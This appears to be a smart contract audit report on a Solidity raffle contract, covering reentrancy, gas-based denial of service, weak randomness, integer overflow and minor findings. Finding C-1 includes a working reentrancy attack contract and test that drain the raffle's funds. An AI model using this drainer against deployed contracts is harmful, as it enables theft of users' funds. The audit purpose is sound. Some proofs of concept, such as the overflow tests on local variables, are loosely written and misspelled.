

### [C-1] Reentrancy allow entrant to drain raffle balance

**Description:**  In refund function we make external call before update state which is obvious reentrancy possibility.

**Impact:**  Critical, possibility of stealing funds from protocol

**Proof of Concept:**
contract ReentrancyAtack {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }
    
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this)); 
        puppyRaffle.refund(attackerIndex);


    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex); 
        }
    }

}

     function testReentrecnyRefynd() public  {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAtack attackerContract = new ReentrancyAtack(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startkingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContracTbalance = address(puppyRaffle).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();
    
        console.log("starting attacker contract balance: ", startkingAttackContractBalance);
        console.log("starting contract balance: ", startingContracTbalance);
        console.log("ending attacker contract balance: ", address(attackerContract).balance);
        console.log("ending contract balance: ", address(puppyRaffle).balance);
 
    }

**Recommended Mitigation:** Follow Check Effects Intreactions pattern, or use ReentrancyGuard libary from openzeppelin.

### [H-1] Denial of Service

**Description:** Enter raffle function uses for loop to iterate through players and push them into players array, but each subsequent itearition will cost more and more gas so the later u will be the more gas this enter would cost you.

**Impact:** high, Denial of entering raffle with huge amount of players.

**Proof of Concept:**
function testDos() public {
        uint256 plaersNum = 100;
        address[] memory players = new address[](plaersNum);

        for(uint256 i = 0; i < plaersNum; i++){
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * plaersNum}(players);
        uint256 gasEnd = gasleft();

        uint256 totalGasCost = gasStart - gasEnd;

        console.log("Gas cost: ", totalGasCost);

        uint256 playersNum2 = 100;
        address[] memory players2 = new address[](playersNum2);

        for(uint256 i = 0; i < playersNum2; i++){
            players2[i] = address(i + plaersNum);
        }
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum2}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 totalGasUsed2 = gasStart2 - gasEnd2;

        console.log("Gas used for 200 players: ", totalGasUsed2);
        console.log("Gas increase: ", totalGasUsed2 - totalGasCost);
    }

**Recommended Mitigation:** Consider use mapping to check for duplicates
mapping(address => uint256) public addressToRaffleId;
uint256 public raffleId = 1;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {

        require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
        
        players.push(newPlayers[i]);
        addressToRaffleId[newPlayers[i]] = raffleId;
    }
    
    emit RaffleEnter(newPlayers);
}

function selectWinner() external {
 
    
   
    raffleId++;
    delete players; 
}

### [H-2] TITLE Weak RNG allow user to influecne or predict the winner

**Description:** In select winner function we uses weak rng, randomness based on  msg.sender, block.timestamp, block.difficulty can be easliy manipulated by miners, so in this case than can "choose" which nft they wanna mint.

**Impact:** Miners  can infulence the winner of the raffle, winning the money

**Proof of Concept:**
 Validators can know ahead of time the block.timestamp and block.difficulty


**Recommended Mitigation:**  USE chainlink VRF for the fully verified randomness.



### [L-1] Old version of solidity allows overflow and underflow numbers.

**Description:**  contract ./src/PuppyRaffle.sol use 0.7.4 version of solidity, 0.8.0 above are more safier to use.Allows protocol to overflow and underflow numbers due to unchecking numbers.

**Impact:**  Possibilty of over/underflow, in verions below 0.8.0 over/underflow arent automaticly checked by solidity.

**Proof of Concept:**
totalFees = totalFees + uint64(fee); //q what if fee would be over 2^63??

    function testOverFlow() public {
        uint64 totalFee = puppyRaffle.totalFees();
        uint64 overflow = 2**64 - 1;
        // totalFee is uint64 so if we add 2^64  the amount of totalFee will reset to 0
        totalFee = totalFee + overflow + 1;
        console.log(totalFee); // value is 0

    }

    function testUnderFlow() public {
        uint64 totalFee = puppyRaffle.totalFees();
        totalFee = totalFee - 1;
        console.log(totalFee); // value is 2^64 - 1
    }
    

**Recommended Mitigation:** Using newer version of solidity, Use safeMath libary

### [L-2] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly thin they have not enteret the raffle

**Description:** If a player at index 0 this will return 0 and it wall also return 0 if plaery are not at raffle.

**Impact:** Wasting gas

**Proof of Concept:**
1.User enters the raffle as the first entrant
2.`PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks he not entered a raffle

**Recommended Mitigation:** Revert is player is not in the array instead of return 0





# Infromational


## [I-1] Missing zero address  check in constuctor
variables:
`PuppyRaffle::feeAddress`



## [I-2] Missing emit the events 

`PuppyRaffle::WithdrawFees` is missing an event

`PuppyRaffle::SelectWinner` is missing an event



## [I-3] Dead code

`PuppyRaffle::_isActivePlayer_` is never used in the whole protocol


# Gas

## [G-1] Unchanged state variables should be constant or immutable.
Reading from storage is much more expensive then reading from cosntant or immutable.
 
`PuppyRaffle::raffleDuration` should be immutable
`PuppyRaffle::commonImageUri` should be constant
`PuppyRaffle::rareImageUri` should be constant
`PuppyRaffle::legendaryImageUri` should be constant


## [G-2] Storage variables in loops should be cached
```diff
+ uint256 playerLength = players.length
- for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
